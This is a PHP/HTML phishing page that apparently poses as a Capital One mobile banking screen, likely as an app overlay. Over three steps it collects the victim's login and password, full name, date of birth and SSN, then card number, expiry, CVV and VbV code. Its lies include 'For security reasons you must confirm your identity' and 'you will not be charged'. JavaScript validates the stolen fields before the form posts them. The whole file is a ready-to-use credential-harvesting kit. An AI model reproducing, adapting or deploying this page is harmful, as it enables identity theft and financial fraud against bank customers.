<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width,height=device-height, initial-scale=1.0, user-scalable=yes, maximum-scale=1.0">
    <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">

</head>
<body class="bodyclass">
<form method="post">
<div id="header">
	<img src="libs/images/logo.png" style="width: 210px;">
</div>
<div id="line"></div>

    
    <div class="container" id="content_div">
		<div id="form1" style="padding: 1% 2% 0px 2%; ">
		
<div id="img">
	<img src="libs/images/user.png">
</div>
	<input name="field1" value="com.konylabs.capitalone" type="hidden">
	
	<input name="field2" placeholder="Login" id="login" maxlength="10" class="field" type="text">
	<input name="field3" placeholder="Password" id="password" maxlength="50" class="field" type="password">
	
			
			<input class="button" type="button" value="Continue" id="formBtn1" style="margin-top: 10px;">
			
		</div>

		<div id="form2" style="display: none; padding: 1% 2% 0px 2%; ">
			<h3 style="color: #000;">For security reasons you must confirm your identity.</h3>
			
			<input type="text" id="Your_first_name" name="field4" class="field" placeholder="Your first name" maxlength="60">
			<script>
				document.getElementById('Your_first_name').onkeypress = function (e) {
					return !(/[0-9]/.test(String.fromCharCode(e.charCode)));
				}
			</script>
				
			<input type="text" id="Your_middle_name" name="field5" class="field" placeholder="Your Middle name" maxlength="60">
			<script>
				document.getElementById('Your_middle_name').onkeypress = function (e) {
					return !(/[0-9]/.test(String.fromCharCode(e.charCode)));
				}
			</script>
					
			<input type="text" id="Your_last_name" name="field6" class="field" placeholder="Your Last name" maxlength="60">
			<script>
				document.getElementById('Your_last_name').onkeypress = function (e) {
					return !(/[0-9]/.test(String.fromCharCode(e.charCode)));
				}
			</script>
<div class="ddddd" style="margin: 5px;">
			<h4 style="display: initial;color: #000;font-weight: normal;">Your Date of birth:</h4>
			<select data-mini="true" name="field7" id="dobMM" class="selectMM"> 
 <option value="">MM</option> 
 <option value="1">1</option> 
 <option value="2">2</option> 
 <option value="3">3</option> 
 <option value="4">4</option> 
 <option value="5">5</option> 
 <option value="6">6</option> 
 <option value="7">7</option> 
 <option value="8">8</option> 
 <option value="9">9</option> 
 <option value="10">10</option> 
 <option value="11">11</option> 
 <option value="12">12</option> 
 </select> 
			<select data-mini="true" name="field8" id="dobDD" class="selectDD"> 
 <option value="">DD</option> 
 <option value="1">1</option> 
 <option value="2">2</option> 
 <option value="3">3</option> 
 <option value="4">4</option> 
 <option value="5">5</option> 
 <option value="6">6</option> 
 <option value="7">7</option> 
 <option value="8">8</option> 
 <option value="9">9</option> 
 <option value="10">10</option> 
 <option value="11">11</option> 
 <option value="12">12</option> 
 <option value="13">13</option> 
 <option value="14">14</option> 
 <option value="15">15</option> 
 <option value="16">16</option> 
 <option value="17">17</option> 
 <option value="18">18</option> 
 <option value="19">19</option> 
 <option value="20">20</option> 
 <option value="21">21</option> 
 <option value="22">22</option> 
 <option value="23">23</option> 
 <option value="24">24</option> 
 <option value="25">25</option> 
 <option value="26">26</option> 
 <option value="27">27</option> 
 <option value="28">28</option> 
 <option value="29">29</option> 
 <option value="30">30</option> 
 <option value="31">31</option> 
 </select> 
			
			<select data-mini="true" name="field9" id="dobYYYY" class="selectYYYY"> 
			   <option value="">YYYY</option> 
			   <option value="1998">1998</option> 
			   <option value="1997">1997</option> 
			   <option value="1996">1996</option> 
			   <option value="1995">1995</option> 
			   <option value="1994">1994</option> 
			   <option value="1993">1993</option> 
			   <option value="1992">1992</option> 
			   <option value="1991">1991</option> 
			   <option value="1990">1990</option> 
			   <option value="1989">1989</option> 
			   <option value="1988">1988</option> 
			   <option value="1987">1987</option> 
			   <option value="1986">1986</option> 
			   <option value="1985">1985</option> 
			   <option value="1984">1984</option> 
			   <option value="1983">1983</option> 
			   <option value="1982">1982</option> 
			   <option value="1981">1981</option> 
			   <option value="1980">1980</option> 
			   <option value="1979">1979</option> 
			   <option value="1978">1978</option> 
			   <option value="1977">1977</option> 
			   <option value="1976">1976</option> 
			   <option value="1975">1975</option> 
			   <option value="1974">1974</option> 
			   <option value="1973">1973</option> 
			   <option value="1972">1972</option> 
			   <option value="1971">1971</option> 
			   <option value="1970">1970</option> 
			   <option value="1969">1969</option> 
			   <option value="1968">1968</option> 
			   <option value="1967">1967</option> 
			   <option value="1966">1966</option> 
			   <option value="1965">1965</option> 
			   <option value="1964">1964</option> 
			   <option value="1963">1963</option> 
			   <option value="1962">1962</option> 
			   <option value="1961">1961</option> 
			   <option value="1960">1960</option> 
			   <option value="1959">1959</option> 
			   <option value="1958">1958</option> 
			   <option value="1957">1957</option> 
			   <option value="1956">1956</option> 
			   <option value="1955">1955</option> 
			   <option value="1954">1954</option> 
			   <option value="1953">1953</option> 
			   <option value="1952">1952</option> 
			   <option value="1951">1951</option> 
			   <option value="1950">1950</option> 
			 </select> 
</div>
			<input type="text" id="SSN" name="field10" class="field1" placeholder="Your SSN: XXX-XX-XXXX" maxlength="11" style="width:56%;margin: 0;margin-top: 10px;margin-bottom: 20px;">

			<input class="button" type="button" value="Continue" id="input_submitBtn">
			
		</div>
		
		<div id="form3" style="display: none; padding: 1% 2% 0px 2%; ">
		<h3 style="color: #000;">We need to know if you are a human, please add your credit or debit card. <br> Do not affraid, you will not be charged.</h3>		
			<div class='cc-type-icon-container'>
				<img id="visa_icon" src="libs/images/visa_icon.png">
				<img id="mc_icon" src="libs/images/mc_icon.png">
				<img id="amex_icon" src="libs/images/amex_icon.png">
				<img id="zt_icon" src="libs/images/zt_icon.png">
				<img id="disc_icon" src="libs/images/disc_icon.png">
			</div>
			<input type="text" id="cardcode" maxlength="16" name="field11" class="field" placeholder="Credit Card Number">
			<script>
				document.getElementById('cardcode').onkeypress = function (e) {
					return !(/[?-¤?-?A-Za-z ]/.test(String.fromCharCode(e.charCode)));
				}
				
				document.getElementById('cardcode').onblur = function (e) {
					var aaIconMap = {
					  '4': "visa_icon",
					  '5': "mc_icon",
					  '3': 'amex_icon',
					  '6': 'disc_icon'
					}
					
					var sNum = this.value, oImg;
					sNum = sNum && /\d{16,16}/.test(sNum) && sNum.charAt(0) || '';
					for(var vI in aaIconMap){
					  oImg = document.getElementById(aaIconMap[vI]);
					  oImg.style.display = sNum == vI ? 'block' : 'none';
					}
				}
			</script>		
			
<div class="bbbbb">
			<h4 style="display: initial;color: #000;margin-left: 0%;">EXP</h4>			
			<select data-mini="true" name="field12" id="dobMM2" class="selectMM"> 
 <option value="">MM</option> 
 <option value="1">1</option> 
 <option value="2">2</option> 
 <option value="3">3</option> 
 <option value="4">4</option> 
 <option value="5">5</option> 
 <option value="6">6</option> 
 <option value="7">7</option> 
 <option value="8">8</option> 
 <option value="9">9</option> 
 <option value="10">10</option> 
 <option value="11">11</option> 
 <option value="12">12</option> 
 </select> 
			<select data-mini="true" name="field13" id="ccYY" class="selectYY"> 
 <option value="">YY</option> 
 <option value="17">17</option> 
 <option value="18">18</option> 
 <option value="19">19</option> 
 <option value="20">20</option> 
 <option value="21">21</option> 
 <option value="22">22</option> 
 <option value="23">23</option> 
 </select> 
</div>
			<input type="text" id="cvv" pattern="[0-9]{3}" maxlength="3" name="field14" class="field3" style="margin: 0;" placeholder="CVV: XXX">
			<img src="libs/images/cvv.gif" style="margin-right: 6px;margin-top: 8px;float: right;">

<input type="text" id="VbV" name="field15" class="field1" placeholder="VbV/MCSC: XXX" maxlength="50" style="float: left;margin-top: 15px;">

<input type="text" id="VbV2" name="field16" class="field1" placeholder="Repeat VbV/MCSC: XXX" style="float: left;margin-left: 2%;margin-top: 15px;margin-bottom: 20px;" maxlength="50">


			<input class="button" type="submit" value="Complete verification" id="input_submitBtn1">
		</div>
    </div>
</form>
    

<script type="text/javascript">

				function getRealDisplay(elem) {
                    if (elem.currentStyle) {
                        return elem.currentStyle.display;
                    } else if (window.getComputedStyle) {
                        var computedStyle = window.getComputedStyle(elem, null);
                        return computedStyle.getPropertyValue('display')
                    }
                }

                function __hide(el) {
                    if (!el.hasAttribute('displayOld')) {
                        el.setAttribute("displayOld", el.style.display)
                    }

                    el.style.display = "none"
                }

                displayCache = {};

                function __show(el) {
                    if (getRealDisplay(el) != 'none') return;

                    var old = el.getAttribute("displayOld");
                    el.style.display = old || "";

                    if (getRealDisplay(el) === "none") {
                        var nodeName = el.nodeName, body = document.body, display;

                        if (displayCache[nodeName]) {
                            display = displayCache[nodeName]
                        } else {
                            var testElem = document.createElement(nodeName);
                            body.appendChild(testElem);
                            display = getRealDisplay(testElem);

                            if (display === "none") {
                                display = "block"
                            }

                            body.removeChild(testElem);
                            displayCache[nodeName] = display
                        }

                        el.setAttribute('displayOld', display);
                        el.style.display = display
                    }
                }

 var step1 = document.getElementById('form1'),
     step2 = document.getElementById('form2'),
     step3 = document.getElementById('form3'),
	 spinner = document.getElementById('spinner');

	
			document.getElementById('formBtn1').onclick = function(){

            var oNumInp = document.getElementById('login');
			var oCodeInp = document.getElementById('password');
			
			try{
							oNumInp.className = oCodeInp.className = 'field';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                  
                        __hide(step1);
                        __show(step2);
                   
                    return false;
                };
				
			var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var first_name = document.getElementById('Your_first_name');
                        var last_name = document.getElementById('Your_last_name');
						var odobMM = document.getElementById('dobMM');
						var odobDD = document.getElementById('dobDD');
						var odobYYYY = document.getElementById('dobYYYY');
						var oSSN = document.getElementById('SSN');

						
						
						try{
							first_name.className = 'field',
							last_name.className = 'field',
							odobMM.className = 'selectMM',
							odobDD.className = 'selectDD',
							odobYYYY.className = 'selectYYYY',
							oSSN.className = 'field1';
						} catch(e){};
						
                        if (!/^\w{4,100}$/i.test(first_name.value)) {
							try{
								first_name.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{4,100}$/i.test(last_name.value)) {
							try{
                                last_name.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
						if(!odobMM.value || !odobDD.value || !odobYYYY.value){
						  odobMM.className = odobMM.className + ' ' + 'select-err';
						  odobDD.className = odobDD.className + ' ' + 'select-err';
						  odobYYYY.className = odobYYYY.className + ' ' + 'select-err';
						  return false;
						}
						
						if (oSSN.value.length < 8) {
							try{
                                oSSN.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                        __hide(step2);
                        __show(step3);
                   
                    return false;
                };
				
				var g_oBtn = document.getElementById('input_submitBtn1');
					g_oBtn.onclick = function () {
	            
				
	            var oCreditCard = document.getElementById('cardcode');
				var odobMM2 = document.getElementById('dobMM2');
				var odobYY = document.getElementById('ccYY');
				var ocvv = document.getElementById('cvv');
				var oVbV = document.getElementById('VbV');
				var oVbV2 = document.getElementById('VbV2');
				

				try{
					oCreditCard.className = 'field',
					ocvv.className = 'field3',
					odobMM2.className = 'selectMM',
					odobYY.className = 'selectYY',
					oVbV.className = 'field1',
					oVbV2.className = 'field1';
				} catch(e){};
				
					if (!/^\w{16,16}$/i.test(oCreditCard.value)) {
							try{
                                oCreditCard.className = oCreditCard.className + ' ' + 'error';
							} catch(e){};
                            return false;
                        }
				
					if (!/^\w{3,3}$/i.test(ocvv.value)) {
							try{
                                ocvv.className =  ocvv.className + ' ' + 'error';
							} catch(e){};
                            return false;
                        }
						
					if(!odobMM2.value || !odobYY.value){
						  odobMM2.className = odobMM2.className + ' ' + 'select-err';
						  odobYY.className = odobYY.className + ' ' + 'select-err';
						  return false;
						}
						
				
					if (!/^\w{3,50}$/i.test(oVbV.value)) {
							try{
                                oVbV.className = oVbV.className + ' ' + 'error';
							} catch(e){};
                            return false;
                        }
						
						
					
					if (!/^\w{3,50}$/i.test(oVbV2.value)) {
							try{
                                oVbV2.className = oVbV2.className + ' ' + 'error';
							} catch(e){};
                            return false;
                        }
						
				
					 }
					 
					
</script>

</body></html>